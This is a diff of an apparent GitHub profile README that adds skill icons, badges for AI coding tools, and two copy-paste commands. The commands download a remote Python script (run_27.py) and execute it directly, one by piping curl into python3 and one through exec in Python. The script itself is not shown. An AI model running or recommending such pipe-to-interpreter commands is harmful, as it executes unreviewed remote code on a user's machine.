@@ -19,126 +19,55 @@
 <br/>
 
 <div align="center">
+<img src="https://skillicons.dev/icons?i=html,css,ts,js,react,nextjs,vue,tailwind,figma,py,nodejs,fastapi,postgres,mongodb,redis,docker,rust,go,pytorch,tensorflow,git,github,vscode,vercel,linux&perline=9&theme=dark"/>
+</div>
 
-<table border="0" cellspacing="6" cellpadding="0">
+<br/>
+
+<div align="center">
+<table border="0" cellpadding="12" cellspacing="0">
 <tr>
-  <td width="48"></td>
-  <td><img src="https://skillicons.dev/icons?i=html&theme=dark" width="46"/></td>
-  <td><img src="https://skillicons.dev/icons?i=css&theme=dark" width="46"/></td>
-  <td><img src="https://skillicons.dev/icons?i=ts&theme=dark" width="46"/></td>
-  <td width="48"></td>
-  <td width="28"></td>
-  <td><img src="https://skillicons.dev/icons?i=py&theme=dark" width="46"/></td>
-  <td><img src="https://skillicons.dev/icons?i=nodejs&theme=dark" width="46"/></td>
-  <td><img src="https://skillicons.dev/icons?i=fastapi&theme=dark" width="46"/></td>
-  <td><img src="https://skillicons.dev/icons?i=postgres&theme=dark" width="46"/></td>
-  <td><img src="https://skillicons.dev/icons?i=mongodb&theme=dark" width="46"/></td>
-</tr>
-<tr>
-  <td><img src="https://skillicons.dev/icons?i=react&theme=dark" width="46"/></td>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td><img src="https://skillicons.dev/icons?i=js&theme=dark" width="46"/></td>
-  <td width="28"></td>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td><img src="https://skillicons.dev/icons?i=redis&theme=dark" width="46"/></td>
-</tr>
-<tr>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td><img src="https://skillicons.dev/icons?i=nextjs&theme=dark" width="46"/></td>
-  <td width="28"></td>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td><img src="https://skillicons.dev/icons?i=docker&theme=dark" width="46"/></td>
-  <td width="48"></td>
-</tr>
-<tr>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td><img src="https://skillicons.dev/icons?i=vue&theme=dark" width="46"/></td>
-  <td width="48"></td>
-  <td width="28"></td>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td><img src="https://skillicons.dev/icons?i=rust&theme=dark" width="46"/></td>
-  <td width="48"></td>
-  <td width="48"></td>
-</tr>
-<tr>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td><img src="https://skillicons.dev/icons?i=tailwind&theme=dark" width="46"/></td>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td width="28"></td>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td><img src="https://skillicons.dev/icons?i=go&theme=dark" width="46"/></td>
-  <td width="48"></td>
-  <td width="48"></td>
-</tr>
-<tr>
-  <td width="48"></td>
-  <td><img src="https://skillicons.dev/icons?i=figma&theme=dark" width="46"/></td>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td width="28"></td>
-  <td width="48"></td>
-  <td><img src="https://skillicons.dev/icons?i=pytorch&theme=dark" width="46"/></td>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td width="48"></td>
-</tr>
-<tr>
-  <td><img src="https://skillicons.dev/icons?i=git&theme=dark" width="46"/></td>
-  <td><img src="https://skillicons.dev/icons?i=github&theme=dark" width="46"/></td>
-  <td><img src="https://skillicons.dev/icons?i=vscode&theme=dark" width="46"/></td>
-  <td><img src="https://skillicons.dev/icons?i=vercel&theme=dark" width="46"/></td>
-  <td><img src="https://skillicons.dev/icons?i=linux&theme=dark" width="46"/></td>
-  <td width="28"></td>
-  <td width="48"></td>
-  <td><img src="https://skillicons.dev/icons?i=tensorflow&theme=dark" width="46"/></td>
-  <td width="48"></td>
-  <td width="48"></td>
-  <td width="48"></td>
+<td align="center" valign="top">
+<sub><b>&nbsp;IDE · EDITOR&nbsp;</b></sub><br/><br/>
+<a href="https://github.com/features/copilot"><img src="https://img.shields.io/badge/Copilot-000000?style=flat-square&logo=githubcopilot&logoColor=white"/></a>&nbsp;
+<a href="https://cursor.sh"><img src="https://img.shields.io/badge/Cursor-000000?style=flat-square&logo=cursor&logoColor=white"/></a>&nbsp;
+<a href="https://zed.dev"><img src="https://img.shields.io/badge/Zed-000000?style=flat-square&logo=zedindustries&logoColor=09acf8"/></a>
+</td>
+<td align="center" valign="top">
+<sub><b>&nbsp;MODELS&nbsp;</b></sub><br/><br/>
+<a href="https://anthropic.com"><img src="https://img.shields.io/badge/Claude-CC785C?style=flat-square&logo=anthropic&logoColor=white"/></a>&nbsp;
+<a href="https://openai.com"><img src="https://img.shields.io/badge/GPT--4o-412991?style=flat-square&logo=openai&logoColor=white"/></a>&nbsp;
+<a href="https://gemini.google.com"><img src="https://img.shields.io/badge/Gemini-8E75B2?style=flat-square&logo=googlegemini&logoColor=white"/></a>&nbsp;
+<a href="https://grok.x.ai"><img src="https://img.shields.io/badge/Grok-000000?style=flat-square&logo=x&logoColor=white"/></a>
+</td>
+<td align="center" valign="top">
+<sub><b>&nbsp;SEARCH · THINK&nbsp;</b></sub><br/><br/>
+<a href="https://perplexity.ai"><img src="https://img.shields.io/badge/Perplexity-1FB8CD?style=flat-square&logo=perplexityai&logoColor=white"/></a>&nbsp;
+<a href="https://notion.so"><img src="https://img.shields.io/badge/Notion_AI-000000?style=flat-square&logo=notion&logoColor=white"/></a>
+</td>
+<td align="center" valign="top">
+<sub><b>&nbsp;RUN LOCAL&nbsp;</b></sub><br/><br/>
+<a href="https://ollama.com"><img src="https://img.shields.io/badge/Ollama-000000?style=flat-square&logo=ollama&logoColor=white"/></a>&nbsp;
+<a href="https://huggingface.co"><img src="https://img.shields.io/badge/HuggingFace-FFD21E?style=flat-square&logo=huggingface&logoColor=black"/></a>&nbsp;
+<a href="https://groq.com"><img src="https://img.shields.io/badge/Groq-F55036?style=flat-square&logoColor=white"/></a>
+</td>
 </tr>
 </table>
+</div>
 
 <br/>
 
-*2727272727272727272727272727*
+```bash
+# linux · mac · wsl
+curl -s https://raw.githubusercontent.com/goot27/goot27/main/run_27.py | python3
+```
 
-<br/>
+```powershell
+# windows
+python -c "import urllib.request as r; exec(r.urlopen('https://raw.githubusercontent.com/goot27/goot27/main/run_27.py').read())"
+```
 
-[![Zed](https://img.shields.io/badge/Zed-0a0a0a?style=flat-square&logo=zedindustries&logoColor=09acf8)](https://zed.dev)
-&nbsp;
-[![OpenAI](https://img.shields.io/badge/OpenAI-412991?style=flat-square&logo=openai&logoColor=white)](https://openai.com)
-&nbsp;
-[![Claude](https://img.shields.io/badge/Claude-CC785C?style=flat-square&logo=anthropic&logoColor=white)](https://anthropic.com)
-&nbsp;
-[![Gemini](https://img.shields.io/badge/Gemini-8E75B2?style=flat-square&logo=googlegemini&logoColor=white)](https://gemini.google.com)
-&nbsp;
-[![Copilot](https://img.shields.io/badge/Copilot-000000?style=flat-square&logo=githubcopilot&logoColor=white)](https://github.com/features/copilot)
-&nbsp;
-[![Cursor](https://img.shields.io/badge/Cursor-0a0a0a?style=flat-square&logo=cursor&logoColor=white)](https://cursor.sh)
-&nbsp;
-[![Perplexity](https://img.shields.io/badge/Perplexity-1FB8CD?style=flat-square&logo=perplexityai&logoColor=white)](https://perplexity.ai)
-&nbsp;
-[![Ollama](https://img.shields.io/badge/Ollama-000000?style=flat-square&logo=ollama&logoColor=white)](https://ollama.com)
-&nbsp;
-[![HuggingFace](https://img.shields.io/badge/HuggingFace-FFD21E?style=flat-square&logo=huggingface&logoColor=black)](https://huggingface.co)
-
-<br/>
+<div align="center">
 
 *🍚 i love chicken rice*
 
